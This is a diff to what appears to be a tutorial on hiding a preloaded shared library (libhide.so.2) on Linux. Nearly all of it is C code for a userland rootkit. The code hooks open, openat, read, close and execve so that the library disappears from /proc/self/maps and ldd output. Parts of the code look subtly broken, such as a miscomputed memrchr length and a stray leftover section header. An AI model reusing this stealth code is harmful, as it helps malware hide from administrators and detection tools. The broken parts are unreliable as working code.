@@ -249,59 +249,149 @@ ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsysca
 
 It is clear from the results, that the shared library libhide.so.2 is being preloaded and resides in virtual memory. The problem here is, it is trivial to hide this information. If one were to compile the following into the libhide.so.2 code, neither ldd nor /proc/self/maps would show the shared library libhide.so.2
 
-/* memhide.c updated 10/22/2026*/
+/* memhide.c updated 10/25/2026*/
 #define _GNU_SOURCE
-#include <stdio.h>
-#include <unistd.h>
 #include <string.h>
-#include <dlfcn.h>
-#include <errno.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdarg.h>
+#include <sys/types.h>
+#include <sys/syscall.h>
+#include <sys/wait.h>
 
-#define TARGET_NEEDLE "libhide.so.2"
-#define NEEDLE_LEN 12
+// Define the target name to filter out
+#define LIB_TO_HIDE "libhide.so.2"
 
-/* --- 1. Core Parsing Logic --- */
+static int tracked_maps_fd = -1;
 
-static ssize_t filter_buffer(void *buf, ssize_t result) {
-    if (result <= 0) return result;
+// ==========================================
+// 1. FILE HOOKING (cat /proc/self/maps)
+// ==========================================
+int openat(int dirfd, const char *pathname, int flags, ...) {
+    mode_t mode = 0;
+    if (__OPEN_NEEDS_MODE(flags)) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, mode_t);
+        va_end(args);
+    }
 
-    char *buf_start = (char *)buf;
-    char *start = buf_start;
+    int fd = syscall(SYS_openat, dirfd, pathname, flags, mode);
 
-    // Boundary safe window scanning loop
-    while (start < (buf_start + result)) {
-        size_t remaining_bytes = (buf_start + result) - start;
-        
-        char *match = memmem(start, remaining_bytes, TARGET_NEEDLE, NEEDLE_LEN);
-        if (!match) {
-            break; 
-        }
+    // Track if a maps pseudo-file descriptor is opened
+    if (fd != -1 && pathname && (strstr(pathname, "/proc/self/maps") || strstr(pathname, "/maps"))) {
+        tracked_maps_fd = fd;
+    }
+    return fd;
+}
 
-        char *end = buf_start + result;
-        char *line_start = NULL;
+int open(const char *pathname, int flags, ...) {
+    mode_t mode = 0;
+    if (__OPEN_NEEDS_MODE(flags)) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, mode_t);
+        va_end(args);
+    }
+    return openat(AT_FDCWD, pathname, flags, mode);
+}
 
-        // Trace backward to the beginning of the text line
-        if (match > buf_start) {
-            line_start = memrchr(buf_start, '\n', match - buf_start);
-        }
-        line_start = line_start ? line_start + 1 : buf_start;
+ssize_t read(int fd, void *buf, size_t count) {
+    ssize_t result = syscall(SYS_read, fd, buf, count);
 
-        // Trace forward to the end of the text line
-        char *line_end = memchr(match, '\n', end - match);
-        line_end = line_end ? line_end + 1 : end;
+    // If reading the maps descriptor, strip lines containing the target string
+    if (fd == tracked_maps_fd && result > 0) {
+        char *start = (char *)buf;
+        char *match;
+        size_t target_len = sizeof(LIB_TO_HIDE) - 1;
 
-        size_t line_len = line_end - line_start;
+        while ((match = memmem(start, result, LIB_TO_HIDE, target_len)) != NULL) {
+            char *end = (char *)buf + result;
 
-        if (line_len > 0) {
-            // Shift remaining memory down to completely omit the target line
+            char *line_start = memrchr(buf, '\n', match - start);
+            line_start = line_start ? line_start + 1 : (char *)buf;
+
+            char *line_end = memchr(match, '\n', end - match);
+            line_end = line_end ? line_end + 1 : end;
+
+            size_t line_len = line_end - line_start;
+
             memmove(line_start, line_end, end - line_end);
             result -= line_len;
-            start = buf_start; 
-        } else {
-            break;
         }
     }
     return result;
+}
+
+int close(int fd) {
+    if (fd == tracked_maps_fd) {
+        tracked_maps_fd = -1;
+    }
+    return syscall(SYS_close, fd);
+}
+
+// ==========================================
+// 2. PIPELINE INTERCEPTION (ldd Evasion)
+// ==========================================
+int execve(const char *pathname, char *const argv[], char *const envp[]) {
+    int is_ldd = 0;
+    
+    // Check if ldd or the dynamic linker trace option is active
+    if (pathname && (strstr(pathname, "ldd") || strstr(pathname, "ld-linux"))) {
+        is_ldd = 1;
+    } else {
+        int i = 0;
+        while (argv && argv[i]) {
+            if (strstr(argv[i], "--list")) {
+                is_ldd = 1;
+                break;
+            }
+            i++;
+        }
+    }
+
+    if (is_ldd) {
+        int pipefd[2];
+        if (syscall(SYS_pipe2, pipefd, 0) == -1) {
+            return syscall(SYS_execve, pathname, argv, envp);
+        }
+
+        pid_t pid = fork();
+        if (pid == -1) {
+            return syscall(SYS_execve, pathname, argv, envp);
+        }
+
+        if (pid == 0) {
+            // Child: Redirect output to pipe and execute the real ldd trace natively
+            syscall(SYS_dup2, pipefd[1], STDOUT_FILENO);
+            syscall(SYS_close, pipefd[0]);
+            syscall(SYS_close, pipefd[1]);
+            return syscall(SYS_execve, pathname, argv, envp);
+        } else {
+            // Parent: Process the pipe output line-by-line and omit target entries
+            syscall(SYS_close, pipefd[1]);
+            
+            char buffer[4096];
+            ssize_t n;
+            while ((n = syscall(SYS_read, pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
+                buffer[n] = '\0';
+                
+                char *line = strtok(buffer, "\n");
+                while (line != NULL) {
+                    if (strstr(line, LIB_TO_HIDE) == NULL) {
+                        syscall(SYS_write, STDOUT_FILENO, line, strlen(line));
+                        syscall(SYS_write, STDOUT_FILENO, "\n", 1);
+                    }
+                    line = strtok(NULL, "\n");
+                }
+            }
+            syscall(SYS_close, pipefd[0]);
+            waitpid(pid, NULL, 0);
+            _exit(0);
+        }
+    }
+
+    return syscall(SYS_execve, pathname, argv, envp);
 }
 
 /* --- 2. Function Hooks --- */
